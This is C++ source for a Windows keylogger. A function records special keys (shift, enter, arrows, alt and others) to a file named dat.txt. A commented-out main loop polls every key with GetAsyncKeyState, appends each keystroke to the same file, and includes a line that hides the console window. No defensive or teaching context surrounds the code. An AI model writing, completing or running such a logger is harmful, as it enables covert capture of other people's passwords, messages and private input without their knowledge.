#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
//#include "header.h"

using namespace std;

void TLOG(string input)
{
	fstream TLOGFile;

	TLOGFile.open("dat.txt", fstream::app);

	if (TLOGFile.is_open())
	{
		TLOGFile << input;
		TLOGFile.close();
	}
}


bool SpecialKeys(int S_Key)
{
	switch (S_Key)
	{
	case VK_SPACE:
		cout << " ";
		TLOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		TLOG("\n");
		return true;
	case '¾':
		cout << ".";
		TLOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		TLOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		TLOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		TLOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		TLOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		TLOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		TLOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		TLOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		TLOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		TLOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		TLOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		TLOG("#ALT");
		return true;
	default:
		return false;
	}
}



//void main()
//{
//	//stringGetter();
//	//ShowWindow(GetConsoleWindow(), SW_HIDE);
//	char KEY = 'x';
//
//	while (true)
//	{
//		Sleep(10);
//		for (int KEY = 8; KEY <= 190; KEY++)
//		{
//			if (GetAsyncKeyState(KEY) == -32767)
//			{
//				if (SpecialKeys(KEY) == false)
//				{
//					cout << "network called" << endl;
//					fstream TLOGFile;
//					TLOGFile.open("dat.txt", fstream::app);
//					if (TLOGFile.is_open())
//					{
//						TLOGFile << char(KEY);
//						TLOGFile.close();
//					}
//				}
//			}
//		}
//	}
//}

